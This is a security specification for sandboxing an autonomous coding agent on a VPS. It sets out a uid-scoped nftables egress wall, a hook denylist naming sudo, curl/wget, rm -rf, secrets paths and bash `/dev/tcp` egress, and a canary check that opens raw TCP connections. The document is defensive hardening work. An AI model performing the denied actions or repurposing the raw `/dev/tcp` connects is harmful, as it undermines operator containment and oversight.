# Spec: vps-provisioning-hardening-2b ("Autonomy + Egress")

**Change**: `vps-provisioning-hardening-2b` (Slice 2, sub-slice 2b)
**Project**: osgania
**Artifact store**: openspec + engram
**Established**: 2026-06-17
**Status**: spec
**Depends on**: `vps-provisioning-hardening-2a` (ARCHIVED, canonical), `platform-security-core` (canonical)

> 2b is a **delta spec**. It encodes ONLY what changes relative to the inherited 2a and platform-security-core contracts. Everything not mentioned here MUST be assumed UNCHANGED. Requirement IDs continue the `HA-` family from 2a, starting at `HA-16`. A parallel `HB-` (hardening-2b) prefix is used for 2b-specific requirements.

---

## Quick path

| Unit | Purpose | Egress state | Allowlist state |
|------|---------|-------------|----------------|
| **STEP 0** (PR/Unit 1) | Restore run path + wire prompt source | Open (wide) | Empty `[]` |
| **Unit 2** (PR/Unit 2) | nft egress wall — IP-pin to Anthropic range | Proven hermetic | Empty `[]` |
| **Unit 3** (PR/Unit 3) | Broad autonomy — reviewed allow[] + dontAsk | Proven hermetic | Reviewed expected-set |

**The order is the security property.** Unit 3 MUST NOT activate on a host where Unit 2 has not been proven hermetic.

---

## Inherited contracts — what does NOT change

The following 2a and platform-security-core requirements are UNCHANGED by 2b. They are listed here for clarity, not re-specification.

| Contract | Requirement | Status in 2b |
|----------|-------------|-------------|
| PSC R1.1–R1.3, R1.5 | guardia hook interface (STDIN/STDOUT shape, exit 0) | Unchanged |
| PSC R1.4 | guardia MUST NOT emit `allow` or `ask` | **Unchanged — 2b does NOT flip guardia to allow** |
| PSC R2.1–R2.6 | guardia denylist: sudo/curl/wget/rm-rf/disk-wipe/secrets/platform | Unchanged |
| PSC R3.1–R3.2 | guardia reason structure | Unchanged |
| PSC R4.1–R4.5 | guardia non-functional constraints (no net, shellcheck, < 2s) | Unchanged |
| PSC R9.1–R9.6 | managed-settings.json: 6 deny entries | Unchanged |
| PSC R9.8 | `permissions.defaultMode == "default"` | **Unchanged** — dontAsk is a CLI flag, not the managed field |
| PSC R10.1 | `permissions.disableBypassPermissionsMode == "disable"` | Unchanged |
| PSC R11.1 | `allowManagedHooksOnly == true` | Unchanged |
| PSC R12.1–R12.2 | Hook registrations (guardia PreToolUse/Bash, camara PostToolUse/*) | Unchanged |
| 2a HA-01.x | Preconditions gate | Unchanged |
| 2a HA-02.x | Node.js runtime and package hold | Unchanged |
| 2a HA-03.x | CLI pin at `@anthropic-ai/claude-code@2.1.153` | Unchanged |
| 2a HA-04.x | Client workspace `/opt/osgania/client/` `aios:aios 0700` | Unchanged |
| 2a HA-05.1–HA-05.2, HA-05.4–HA-05.5, HA-05.7 | Wrapper file, `--bare` invariant, no apiKeyHelper | Unchanged |
| 2a HA-06.1–HA-06.7 | systemd service unit — all directives | Unchanged |
| 2a HA-07.x | systemd timer unit — `OnCalendar=daily` placeholder | Unchanged |
| 2a HA-08.x | API-key delivery via LoadCredential wrapper | Unchanged |
| 2a HA-09.x | Live defense-in-depth probe (HA-09 oracle) | Unchanged — see HB-05 |
| 2a HA-11.x | Slice-1 invariants preserved | Unchanged |
| 2a HA-12.x | Rollback procedure | Extended — see HB-09 |
| 2a HA-14.x | File structure | Extended — see HB-10 |
| 2a HA-15.x | guardia env-dump + net-builtin denylist (step 7.5) | Unchanged |

---

## Flagged amendments to inherited contracts

The following requirements are **deliberately amended by 2b**. They are listed explicitly because they touch ARCHIVED spec assertions; the amendment is reviewed and owned by 2b, NOT a silent change.

### Amendment A1 — PSC R2.7: guardia benign pass-through (replacing defer)

**What was**: PSC R2.7 — "Any command that does not match any of R2.1–R2.6 MUST receive `permissionDecision: "defer"`".

**Amendment (2b)**: The benign branch (no match against R2.1–R2.6 or HA-15.x) MUST emit **NO PreToolUse decision** (exit 0, empty stdout, pass-through). This replaces `"defer"` with pass-through for the unmatched case.

**Why**: Hardware gate #1 (2026-06-17) proved that `permissionDecision:"defer"` is terminal in headless `-p` and pre-empts settings `allow[]` rules — even under `--permission-mode dontAsk` (exp1/2/3). The only way `allow[]` fires is when guardia emits nothing for the benign branch (exp6-proven). guardia stays **deny-only** (R1.4 intact — it MUST still NEVER emit `"allow"`); only the benign tail changes from `defer` to pass-through.

**Scope**: This amendment is confined to the unmatched benign branch of guardia.sh (step 8, the default). Steps 1–7.5 (all DENY categories) are UNCHANGED. R1.4 ("MUST NOT emit `allow`") is UNCHANGED.

**Hardware proof**: exp6 — guardia stub emitting nothing (exit 0) + `allow:[echo]` → `echo` EXECUTES in `-p`. exp1/2/3 — guardia emitting `defer` + `allow:[echo]` + dontAsk → DEFERS regardless.

---

### Amendment A2 — PSC R9.9: allow[] relaxed to tight positive expected-set assertion

**What was**: PSC R9.9 — "`permissions.allow` MUST be an empty array (`[]`)." Also reflected in 2a HA-05.6 structural assert (line: `.permissions.allow == []`) and 2a HA-05-S3 scenario (`.permissions.allow == []`).

**Amendment (2b)**: The assert "`permissions.allow == []`" is **replaced** (not deleted) with a **tight positive expected-set assertion**: `permissions.allow` MUST equal **exactly** the reviewed expected-set derived from observed real `claude -p` runs (see HB-03). The provisioner MUST reject any entry NOT in the expected-set (fail-closed). The check is STRENGTHENED, not loosened.

**Scope**: Replaces the zero-length assertion in PSC R9.9, 2a HA-05.6, and 2a HA-05-S3. All other managed-settings.json asserted keys (6 deny entries, `defaultMode`, `disableBypassPermissionsMode`, `allowManagedHooksOnly`, hook entries) remain asserted UNCHANGED.

---

### Amendment A3 — 2a HA-05.3 / HA-05.6 / HA-05-S3: managed-settings.json no longer byte-identical

**What was**: 2a HA-05.3 — "provision-agent.sh MUST NOT write to managed-settings.json; the live policy file MUST be byte-identical before and after a 2a run." 2a HA-05.6 — "R9–R12 structurally unchanged (read-only)." 2a HA-05-S3 — byte-identical fixture assertion including `.permissions.allow == []`.

**Amendment (2b)**: `provision-agent.sh` (the 2b Unit 3 step) WILL write the reviewed `allow[]` into the live `managed-settings.json`. The file is no longer byte-identical after a 2b Unit 3 run. The 2a byte-identical and `.allow == []` assertions are superseded for 2b by the tight positive expected-set assertion (Amendment A2). The live-artifact pattern (same as 2a's HA-15 guardia extension) is followed: the change is flagged here, not silent.

---

## Requirements

Requirement IDs: HB-xx for new 2b requirements; see inherited table above for unchanged HA-xx. Scenarios are tagged `HOST-SAFE` or `LINUX-ROOT/LIVE-KEY` per the 2a testability taxonomy.

---

### HB-01 — STEP 0: Restore the run path + wire the prompt source

> Unblocks all behavioral measurement. Without STEP 0, nothing in HB-02 through HB-07 is testable end-to-end.

**HB-01.1** After Unit 1 provisioning, `/opt/osgania/platform/bin/agent-run.sh` MUST exist with owner `root`, group `root`, mode `0755`. This is a re-provision of the same file as 2a HA-05.1; the STEP 0 step installs it onto the half-provisioned box where it was absent.

**HB-01.2** After Unit 1 provisioning, `/opt/osgania/client/` MUST exist with owner `aios`, group `aios`, mode `0700`. Same as 2a HA-04.1; asserted again as a STEP 0 exit criterion.

**HB-01.3** A task/prompt file MUST be wired inside `agent-run.sh` (option P1). The wrapper MUST read an operator-controlled prompt file and exec the agent using the canonical form:

```bash
exec /usr/bin/claude --permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"
```

`PROMPT_FILE` is the canonical double-quoted variable holding the absolute prompt file path. `--permission-mode dontAsk` MUST precede `-p` so it is not consumed as the prompt value. The canonical claude invocation is built entirely inside the wrapper; **`ExecStart` remains byte-identical** (`ExecStart=/opt/osgania/platform/bin/agent-run.sh -p`).

**The 2b wrapper is a PRODUCTION LAUNCHER, not a transparent pass-through.** Unlike the 2a wrapper (`exec /usr/bin/claude "$@"`), the 2b wrapper hardcodes the entire claude invocation (`--permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"`) and intentionally ignores `"$@"` beyond the HB-01.8 `-p` guard. Any additional arguments passed by the caller — including `--output-format`, `--verbose`, `--dangerously-skip-permissions` — are SILENTLY DISCARDED by the 2b wrapper. Verification paths that require different claude arguments (such as the HA-09 probe) MUST invoke `/usr/bin/claude` directly and MUST NOT route through this wrapper. See HB-05.2 and HB-05.4.

**HB-01.4 — Prompt file integrity (load-bearing).** The prompt file MUST be:
- owned by `root:root`,
- mode `0644` (world-readable, not writable by group or other — aios CAN read it, but MUST NOT write it),
- located OUTSIDE the agent-writable `WorkingDirectory` subtree (`/opt/osgania/client/`) — it MUST NOT be writable by the aios principal.

Canonical path: repo `platform/prompts/agent-prompt.txt` → installed `/opt/osgania/platform/prompts/agent-prompt.txt` (`root:root 0644`). This path is consistent with the real `platform/` → `/opt/osgania/platform/` install mapping in `provision-agent.sh`.

Rationale: a now-capable agent with write access to `/opt/osgania/client/` MUST NOT be able to rewrite its own next-run prompt (privilege-escalation-of-intent). The `platform/` subtree is already denied to the agent by managed deny[] entries 5–6 (Edit/Write platform/**) and guardia Step-7 (R2.6).

**HB-01.5** `provision-agent.sh` MUST include a Unit 1 exit criterion check that verifies:
- `systemctl start osgania-agent.service` exits 0 (or the service completes without `ExecStart` failure),
- at least one audit record appears in `/var/log/osgania/audit.jsonl` after the start,
- the journal for the run does NOT contain the string `"Input must be provided"`.

Note: In Unit 1 guardia still emits `defer` for benign Bash (the 2a behavior), so no Bash tool execution occurs during a typical U1 run. The criterion "produces an audit record" is nonetheless satisfied: the `camara` PostToolUse hook logs stream-json `init` and `result` events even when no Bash tool executes — those events appear in `/var/log/osgania/audit.jsonl`. The absence of a Bash tool execution does NOT prevent the audit record criterion from being met.

**HB-01.6 — --bare ban preserved.** The 2b wrapper amendment (adding the prompt source) MUST NOT introduce `--bare` anywhere in the wrapper or in ExecStart. The 2a HA-05.4/HA-06.2 ban remains in effect; `provision-agent.sh` MUST lint both the assembled ExecStart and the wrapper content for the `--bare` token before writing.

**HB-01.7 — apiKeyHelper stays abandoned.** The LoadCredential → `ANTHROPIC_API_KEY` export pattern is preserved. The wrapper MUST NOT reintroduce `apiKeyHelper` or any alternate key-source path.

**HB-01.8 — Wrapper guard against direct interactive invocation.** The wrapper MUST verify it was invoked with `-p` as an argument (i.e., `"$@"` contains `-p`) before executing the canonical claude invocation. If `-p` is absent, the wrapper MUST exit non-zero with a clear error message and MUST NOT exec claude. This prevents a direct operator call of the wrapper from opening an interactive `--permission-mode dontAsk` session (which would be a capable session with no human-in-the-loop prompt gating).

Note: the guard MUST detect `-p` as a **standalone positional argument** by iterating over `"$@"` (e.g. `for arg in "$@"; do [[ "$arg" == "-p" ]] && found=1; done`), NOT by a `$*` substring match. A `$*` substring match would falsely trigger on a value argument that happens to contain the characters `-p` (e.g. `--flag=-path`). Only the standalone form is correct.

**Isolation boundary (HB-01):** The prompt file is root-owned; aios cannot write it. The wrapper is root:root 0755; aios cannot swap it. ExecStart is byte-identical — no new flags are passed from the unit to the wrapper. The wrapper guard (HB-01.8) ensures the canonical exec path is the only reachable path.

---

### HB-02 — nftables egress wall (per-uid 9001, IPv4 + IPv6)

> This is the **proven nft IP-pin ruleset** (hardware-verified 2026-06-17). It MUST be deployed AND proven hermetic before Unit 3 is activated.

**HB-02.1** A root-managed nftables `inet` table named `osgania_egress` MUST be loaded in the host network namespace. The exact ruleset MUST be semantically equivalent to:

```
table inet osgania_egress {
  chain out {
    type filter hook output priority 0;
    policy accept;
    meta skuid 9001 jump aios_egress
  }
  chain aios_egress {
    ip daddr 127.0.0.0/8 accept
    ip6 daddr ::1/128 accept
    ip daddr 160.79.104.0/23 tcp dport 443 accept
    ip6 daddr 2607:6bc0::/48 tcp dport 443 accept
    counter drop
  }
}
```

The `meta skuid 9001` matcher MUST be used (uid-based, not cgroup-based — hardware gate #6 proved `meta skuid 9001` is the correct and timing-safe selector for a `Type=oneshot` unit).

**HB-02.2 — Anthropic CIDRs (exact, from published documentation).**
- IPv4: `160.79.104.0/23` (Anthropic inbound range — "will not change without notice").
- IPv6: `2607:6bc0::/48` (Anthropic inbound range — same stability commitment).

These values MUST be defined as provisioner constants and MUST NOT be hardcoded in multiple places. The design phase SHALL document the refresh procedure for the event Anthropic changes its published range.

**HB-02.3 — Default-deny for uid 9001.** All OUTPUT traffic originating from uid 9001 that does not match the explicit accept rules (loopback or Anthropic-range:443) MUST be dropped. The `counter drop` rule is the terminal action. No other ports, no other destinations, no explicit DNS/NTP/apt allowances for uid 9001 (those services run under other uids and are unaffected — hardware-verified: `_apt`/root for apt, `systemd-timesync` for NTP, `systemd-resolved` for upstream DNS).

**HB-02.4 — IPv4 and IPv6 in lockstep.** The ruleset MUST cover both address families. An `nft inet` table (rather than separate `ip`/`ip6` tables) provides this. The `ip daddr` and `ip6 daddr` rules MUST both be present; omitting either is a specification violation.

**HB-02.5 — Host-netns, root-managed, zero-cap aios cannot flush.** The table is loaded by root in the host network namespace. The `aios` principal runs with `CapabilityBoundingSet=` (empty — all capabilities dropped, 2a HA-06.1) and therefore MUST NOT be able to run `nft flush table` or any equivalent. The unit's `RestrictAddressFamilies` and systemd sandboxing directives are UNCHANGED — the firewall operates at the host level, independent of the unit sandbox.

**HB-02.6 — Other principals unaffected.** The `meta skuid 9001` scope means the `policy accept` in `chain out` applies to all traffic from OTHER uids. Specifically:
- root (uid 0) and the operator's SSH session MUST remain reachable,
- apt (`_apt`, uid varies) MUST retain its full network access,
- `systemd-timesync` and `systemd-resolved` MUST retain their network access.

**HB-02.7 — Persistence across reboots.** The nft ruleset MUST be loaded on every boot (before `osgania-agent.service` activates). The persistence mechanism (systemd unit, `/etc/nftables.conf` drop-in, or equivalent) is resolved by the design phase; this spec encodes the requirement that the wall is not transient.

**HB-02.7a — Boot ordering: wall precedes agent.** BOTH `osgania-agent.service` AND `osgania-agent.timer` MUST each declare `After=nftables.service` and `Wants=nftables.service` (or `Requires=nftables.service`) so that on every boot the egress wall is loaded before the agent can activate. Both units are required — omitting either is a specification violation. This is a hard ordering dependency — a boot race where the agent runs before the wall is loaded defeats the delivery-ordering invariant.

**HB-02.8 — Telemetry disabled at the unit level.** The `osgania-agent.service` unit MUST include the following `Environment=` directives:
```
Environment=DISABLE_TELEMETRY=1
Environment=DISABLE_ERROR_REPORTING=1
```
Rationale: the agent contacts Datadog telemetry endpoints by default; the egress wall blocks Datadog anyway, but the env vars suppress the attempt at source and eliminate any retry/timeout cost.

**HB-02.9 — nft ruleset install MUST be idempotent.** The provisioner step that installs the nft ruleset MUST delete any existing `table inet osgania_egress` before recreating it (delete-before-recreate pattern, or equivalent `nft -f` replace), so running Unit 2 twice yields exactly one `osgania_egress` table and does not stack duplicate chains.

**HB-02.10 — uid-isolation assumption documented.** The UID-scoped ruleset assumes that apt, NTP, and upstream DNS services run under their own dedicated service UIDs (`_apt`/root, `systemd-timesync`, `systemd-resolved`) and NOT under uid 9001. Hardware gate #12/13/14 confirmed this. This is an ACCEPTED ASSUMPTION; if any of these services are reconfigured to run as uid 9001, the wall would also block them — operator action required.

**Isolation boundary (HB-02):** The nft table is root-managed in the host netns. aios (zero caps, no sudo) cannot modify nft rules. The wall operates below the application layer — the agent process cannot bypass it regardless of what tools are allowlisted. Docker/Coolify are confirmed absent (hardware gate #10); their presence would insert DOCKER nft chains and requires operator action (documented pre-requisite).

---

### HB-03 — Broad autonomy: permissions.allow[] positive expected-set

> Unit 3 only. MUST NOT be activated before HB-02 is proven hermetic (see HB-06).

**HB-03.1** `permissions.allow[]` MUST be populated with a reviewed expected-set. The **exact entries are NOT specified in this spec** — they MUST be derived from observed real `claude -p` runs on the STEP-0-restored box (after Unit 1 has completed) and then reviewed by the operator before Unit 3 is activated. The design phase SHALL document the derivation procedure.

**HB-03.2 — Tight positive expected-set assertion (replaces PSC R9.9 / Amendment A2).** The provisioner MUST assert that the live `managed-settings.json` `permissions.allow[]` equals **exactly** the reviewed expected-set. The assertion MUST:
- verify the array length equals the expected-set length,
- verify every expected entry is present,
- verify no entry is present that is NOT in the expected-set (fail-closed on any unexpected entry).

The provisioner MUST abort with exit code > 0 if any unexpected allow entry is found.

**HB-03.3** The allow[] MAY include build/test/git commands, and MAY include interpreters (`node`, `python3`), as produced by the observation-driven derivation procedure (HB-03.1). The spec does NOT mandate specific entry names — the TIGHT POSITIVE EXPECTED-SET ASSERTION (HB-03.2) is the security control, not a mandated entry list.

**HB-03.4 — `--permission-mode dontAsk` applied as a CLI flag.** The `agent-run.sh` wrapper MUST pass `--permission-mode dontAsk` in the canonical exec line (HB-01.3), with the flag BEFORE `-p`. This flag MUST be applied inside the wrapper, NOT as a change to the managed `permissions.defaultMode` field (which MUST remain `"default"` to preserve the HA-09 probe oracle — PSC R9.8 unchanged). The canonical exec form is `exec /usr/bin/claude --permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"` with no other ordering variant permitted.

**HB-03.5 — dontAsk behavior contract (hardware-proven).** Under `--permission-mode dontAsk` with guardia passing through (Amendment A1), any Bash command NOT covered by an `allow[]` entry AND NOT classified as read-only by the CLI MUST auto-DENY cleanly (`terminal_reason:"completed"`, no stall). Hardware gate #2 proved: `python3 -c`, `node -e`, `cat /etc/hostname`, and `touch` all auto-DENY; only `echo`-class read-only commands auto-run without an allow entry.

**HB-03.6 — Deny-first precedence preserved.** The 6-entry managed `deny[]` (PSC R9.1–R9.6) retains first-match-wins precedence over `allow[]`. An `allow[]` entry MUST NOT re-open a command already matched by a deny rule (e.g. `Bash(sudo *)`, `Bash(curl *)`, `Bash(wget *)`). This is enforced by the Claude Code permission flow (deny → ask → allow).

**Isolation boundary (HB-03):** Allow rules fire only after guardia (denial layer) and the managed deny rules pass. guardia's DENY categories are unchanged. The dontAsk flag is a CLI argument — the managed `disableBypassPermissionsMode:"disable"` is independent of it (hardware gate #1 exp3: dontAsk engaged under disableBypass:disable). A capable agent with interpreters in the allow[] is contained by the egress wall (HB-02), not by guardia.

---

### HB-04 — guardia benign pass-through (implements Amendment A1)

> Unit 3 only. The guardia pass-through change MUST NOT be deployed before Unit 2 is proven hermetic (see HB-06). During Units 1–2, guardia.sh stays the 2a version (benign Bash → defer); gate #1's defer-terminal property is the egress-open safety net while the wall is being built.

**HB-04.1** The updated `guardia.sh` MUST emit NO output (empty stdout) and exit 0 when `tool_name == "Bash"` and the command does not match any of R2.1–R2.6 or HA-15.x (env-dump / net-builtin). This replaces the prior `permissionDecision:"defer"` emission for the benign branch.

**HB-04.2** All DENY categories (R2.1–R2.6 + HA-15.1–HA-15.5a) MUST remain UNCHANGED. guardia MUST still emit `permissionDecision:"deny"` for: sudo, curl/wget, rm-rf, disk-wipe, secrets-path, platform-path, env-dump verbs/paths, and bash-native egress (`/dev/tcp`, `/dev/udp`).

**HB-04.3** For non-Bash tool names, guardia MUST emit NO decision (empty stdout, exit 0) — same pass-through behavior as the benign Bash case (Amendment A1). This IS an intentional behavior change from the prior PSC R1.6 defer behavior: hardware gate #1 proved that `permissionDecision:"defer"` is TERMINAL in headless `-p` and pre-empts the permission flow — including for allowlisted non-Bash tools (even under `--permission-mode dontAsk`). Pass-through is the intended behavior so that non-Bash tool calls (Read, Write, etc.) are decided by the normal flow: gate #2 proved that under `dontAsk`, non-allowlisted tools auto-DENY cleanly, making pass-through safe.

**HB-04.4** The updated `guardia.sh` MUST pass `shellcheck -s bash` with no warnings or errors. The benign pass-through change MUST NOT introduce any `set -e`/`pipefail` trap or other path that causes a non-zero exit for benign commands.

**HB-04.5** No PreToolUse decision JSON is emitted at all in the pass-through cases (benign Bash, non-Bash tools, malformed/empty-STDIN early-returns). The Claude Code runtime treats an empty/absent PreToolUse response as pass-through and lets the normal permission flow (deny[] → ask → allow[]) decide. The prior PSC R3.2 "may be empty string" clause for defer does not apply to these branches since no JSON is emitted.

**Isolation boundary (HB-04):** The change is a one-line removal in the benign branch (remove the `defer` emit path). All deny logic is structurally above this branch; first-match-wins means removing the benign defer cannot affect any deny outcome.

---

### HB-05 — HA-09 probe oracle survival under dontAsk-as-CLI-flag

**HB-05.1** The HA-09 defense-in-depth probe (2a HA-09.1–HA-09.4) MUST survive the 2b changes. Specifically: when `provision-agent.sh` runs the probe with `--dangerously-skip-permissions`, the stream-json `init` event MUST still report `permissionMode != "bypassPermissions"` (VERIFIED condition), because:
- the managed `disableBypassPermissionsMode:"disable"` remains in effect (unchanged), AND
- `defaultMode` in managed-settings remains `"default"` (unchanged — dontAsk is a CLI flag, not the managed field).

**HB-05.2** The HA-09 probe MUST invoke `/usr/bin/claude` DIRECTLY — NOT through the production wrapper (`agent-run.sh`). The probe MUST export `ANTHROPIC_API_KEY` itself from `AGENT_SECRETS_KEY` (`/etc/osgania/secrets/anthropic-api-key`), the provisioner's persistent on-disk key path, using the same `tr -d '[:space:]'` strip pattern used by the wrapper, and then call:

> **Note (probe-context key source):** `CREDENTIALS_DIRECTORY` is a systemd LoadCredential variable set only at service runtime; the provisioner runs outside systemd, so the probe reads the persistent on-disk path (`AGENT_SECRETS_KEY`) instead.

```bash
/usr/bin/claude -p --output-format stream-json --verbose --dangerously-skip-permissions '<benign prompt>'
```

The probe MUST NOT include `--permission-mode dontAsk`. The probe MUST NOT call `"$wrapper"` or `agent-run.sh`.

**Rationale (JD-6 resolution):** The 2b wrapper is a production launcher that hardcodes `--permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"` and discards `"$@"` beyond the `-p` guard (HB-01.3). Routing the probe through the 2b wrapper would: (a) DISCARD `--output-format stream-json --verbose --dangerously-skip-permissions` → no stream-json `init` event → `permissionMode` field absent → oracle cannot evaluate → HB-05.1 BROKEN; (b) INJECT `--permission-mode dontAsk` into the probe path → HB-05.2 VIOLATED. The probe tests the managed-settings layer (`disableBypassPermissionsMode:"disable"` neutralizing `--dangerously-skip-permissions`), which is independent of the wrapper. Invoking claude directly preserves both oracles.

**HB-05.3** Hardware-verified (gate #1 exp3): `dontAsk` is engaged under managed `disableBypassPermissionsMode:disable` (not blocked by it). The probe can confirm the bypass is still neutralized without interference from the dontAsk flag.

**HB-05.4** The probe's direct `/usr/bin/claude` invocation MUST still produce a stream-json `init` event whose `permissionMode != "bypassPermissions"` (the VERIFIED condition from HA-09.2). This is satisfied because: `managed-settings.json` carries `disableBypassPermissionsMode:"disable"` (unchanged), which neutralizes `--dangerously-skip-permissions` regardless of whether the probe goes through the wrapper. The direct invocation preserves HB-05.1 by delivering the stream-json `init` event intact.

---

### HB-06 — Delivery-ordering invariant + fail-closed machine check

> This is a **non-negotiable** requirement. It MUST survive into the tasks phase and be enforced in the provisioner code, not only in PR ordering.

**HB-06.1 — Ordering invariant.** The egress wall (Unit 2, HB-02) MUST be deployed AND proven hermetic on the target host BEFORE the broad `allow[]` (Unit 3, HB-03) is written. This is a security property, not a convention — a capable agent behind an unproven or absent wall is the worst-case posture.

**HB-06.2 — Fail-closed machine check in the provisioner (non-negotiable).** The Unit 3 provisioner step MUST include a fail-closed precondition gate that REFUSES to write a non-empty `permissions.allow[]` unless ALL THREE of the following are true on the SAME host at check time:

**(a) nft wall loaded:** `nft list table inet osgania_egress` exits 0 AND the output contains `aios_egress` AND the `counter drop` rule is present in the `aios_egress` chain.

**(b) Root positive-control connect (REQUIRED — closes the canary fail-open):**

- Before running the uid-9001 self-check, the gate MUST verify the canary is reachable from root (uid 0) WITHOUT the per-uid wall. This positive control proves the canary endpoint is reachable on this network. Without it, an upstream network filter that independently blocks `1.1.1.1:443` produces the same uid-9001 timeout (exit 124) as a functioning wall → false PROCEED → allow[] written with no real wall.
- The root positive-control connect uses the same python3 or bash form as the uid-9001 self-check but is run as uid 0 (no `--uid=9001` — run directly by the provisioner, not via `systemd-run`). A successful TCP connect (exit 0) confirms the canary is reachable.
- If the root positive-control connect FAILS (canary unreachable even from root): the canary is unsuitable or the network independently blocks it → **REFUSE** (do not write allow[]) and report the canary as unusable. This is fail-closed.

**(c) Live hermetic self-check BLOCKED (fail-closed, run by the root provisioner as uid 9001):**

- The self-check runs via `systemd-run --uid=9001` (a transient unit from the root provisioner); it does NOT pass through guardia's hook, so a real connect tool is appropriate here.
- The canary address MUST be a routable, non-loopback address OUTSIDE the Anthropic ranges (`160.79.104.0/23`, `2607:6bc0::/48`) and OUTSIDE loopback (`127.0.0.0/8`, `::1/128`). Default canary: `1.1.1.1:443`. A canary inside the Anthropic range would make the gate always refuse (the wall allows those); a loopback canary would always falsely pass (loopback is accepted).
- The connect MUST use a method that genuinely attempts a TCP connection and succeeds when the wall is ABSENT. The **python3 form is the PREFERRED/primary** method — its `settimeout(5)` is a pure user-space socket timeout, independent of kernel retransmit tuning (`net.ipv4.tcp_syn_retries`), and always raises `TimeoutError` → exit 124 when blocked. The bash `/dev/tcp` form is an acceptable fallback (see note on kernel-timeout assumption below). Mandated forms:
  ```bash
  python3 -c "import socket,sys
  s=socket.socket(); s.settimeout(5)
  try: s.connect(('1.1.1.1',443)); sys.exit(0)
  except TimeoutError: sys.exit(124)
  except OSError: sys.exit(1)"
  ```
  or (bash fallback — see kernel-timeout caveat below):
  ```bash
  /bin/bash -c 'timeout 5 bash -c "exec 3<>/dev/tcp/1.1.1.1/443"'
  ```
  `/bin/sh` (= dash on Ubuntu 24.04) MUST NOT be used — dash does NOT support `/dev/tcp`, so the connect always errors and the gate reads "blocked" on any box regardless of wall state (fail-OPEN — wall-absent box would falsely pass). Use `python3` (preferred) or `/bin/bash` explicitly.

  **Normative ordering requirement (python3 form):** The `except TimeoutError` clause MUST appear BEFORE `except OSError` — `TimeoutError` is a subclass of `OSError`, so reversing the order would catch a timeout as `OSError` → exit 1 (REFUSE) instead of exit 124 (PROCEED), silently locking the gate to REFUSE forever.

  **`TimeoutError` vs `socket.timeout`:** The active forms use `except TimeoutError` (the non-deprecated name, Python ≥3.3). `socket.timeout` is a deprecated alias (Python 3.11+) that risks a future `NameError` on Ubuntu 24.04's Python 3.12; do NOT use it in active code. (Historical RESOLVED notes that quote `socket.timeout` as the prior form are left as-is.)

  **Bash-form kernel-timeout caveat (FIX-D):** The bash form's "exit 124 = timeout = PROCEED" contract assumes `net.ipv4.tcp_syn_retries` is at its default (≥6, ~127s) so the user-space 5s `timeout` fires before the kernel abandons the SYN. On a host with `tcp_syn_retries` tuned down, the kernel may abandon first → bash `timeout` sees the child exit non-124 → REFUSE (fail-closed, but a working wall would be wrongly refused). The python3 form is immune to this because `settimeout(5)` is a pure user-space socket timeout. This is why python3 is preferred.

- **Fail-closed exit semantics (unambiguous, enforced):**
  - A **SUCCESSFUL** connection (bash exit 0 / python3 `connect` raises no exception → exit 0) means WALL ABSENT or MISCONFIGURED → **REFUSE** (do not write allow[]).
  - A **BLOCKED** result — the nft `drop` causes a TIMEOUT (bash `timeout` exits **124** / python3 catches `TimeoutError` → exits **124**) — means WALL PRESENT → **PROCEED**. This is the ONLY exit code that unlocks writing allow[]; exit 124 and exit 124 alone.
  - **ANY other/ambiguous outcome** (ECONNREFUSED → non-zero (typically exit 1) → REFUSE for bash / exit 1 for python3, unexpected exception → exit 1, non-124 non-0 bash exit, any non-0 non-124 python3 exit) → **REFUSE** (fail-closed). Note: for the bash `/dev/tcp` form, exit codes for a failed redirection are implementation-defined; only the python3 form guarantees exit 1 via explicit `sys.exit(1)`. The security behavior is unchanged — anything ≠ 124 = REFUSE. The provisioner MUST write allow[] ONLY when exit code is EXACTLY 124 AND the nft table is confirmed loaded; every other outcome refuses.
  - For the bash form: the inner transient's exit code IS the connect result — no `; echo $?` suffix is permitted. Adding `; echo $?` always exits 0 (echo succeeds) and destroys the exit-code signal.
  - For the python3 form: exit 0 = connected = REFUSE; exit 124 = `TimeoutError` = wall PRESENT = PROCEED; exit 1 (OSError, including ECONNREFUSED) = REFUSE. The provisioner proceeds ONLY on exit 124.
- **Provisioner gate logic (explicit — THREE conditions, all required):** Write `allow[]` ONLY IF ALL THREE hold: (a) the nft table `inet osgania_egress` is loaded; (b) the root positive-control connect SUCCEEDS (exit 0 — canary is reachable from uid 0); (c) the uid-9001 self-check exits EXACTLY 124 (canary is blocked for uid 9001). Exit 0 on the uid-9001 self-check → REFUSE. Any non-124 non-0 exit on the uid-9001 self-check → REFUSE. Root positive-control failure → REFUSE. Exit 124 on uid-9001 is the single PROCEED signal; everything else is fail-closed REFUSE.
  - The nft rule uses `drop` (not `reject`) so the expected proceed-signal when the wall is present is a TIMEOUT — the `timeout 5` / `settimeout(5)` wrapper ensures the check does not hang indefinitely.
- The self-check transient MUST run with a clean, minimal environment and MUST NOT receive or reference `ANTHROPIC_API_KEY`. It only needs a TCP connect; no credentials are needed or appropriate.
- The `systemd-run` invocation MUST include `</dev/null` and a `trap 'restore' EXIT INT TERM` backstop in the provisioner to prevent the gate-#2 box-mutation incident (STDIN-EOF mutation when the run is interrupted). The transient unit MUST use a FIXED unit name (`--unit=osgania-egress-selfcheck`) so the `restore` function can deterministically stop it. The `restore` function MUST be: `restore() { systemctl stop osgania-egress-selfcheck.service 2>/dev/null || true; }`. A no-op `restore` does NOT satisfy this requirement.
- **Full authoritative `systemd-run` invocation (design §5 is the canonical form — implementers MUST use it)**. The required flags are `--uid=9001 --gid=9001 --pipe --quiet --collect --unit=osgania-egress-selfcheck --property=RestrictAddressFamilies='AF_INET AF_INET6' --property=Environment=''` (clean env, no `ANTHROPIC_API_KEY`). Full python3 form (preferred):
  ```bash
  systemd-run --uid=9001 --gid=9001 --pipe --quiet --collect \
    --unit=osgania-egress-selfcheck \
    --property=RestrictAddressFamilies='AF_INET AF_INET6' \
    --property=Environment='' \
    python3 -c "import socket,sys
  s=socket.socket(); s.settimeout(5)
  try: s.connect(('1.1.1.1',443)); sys.exit(0)
  except TimeoutError: sys.exit(124)
  except OSError: sys.exit(1)" </dev/null
  ```
  Full bash fallback form:
  ```bash
  systemd-run --uid=9001 --gid=9001 --pipe --quiet --collect \
    --unit=osgania-egress-selfcheck \
    --property=RestrictAddressFamilies='AF_INET AF_INET6' \
    --property=Environment='' \
    /bin/bash -c 'timeout 5 bash -c "exec 3<>/dev/tcp/1.1.1.1/443"' </dev/null
  ```
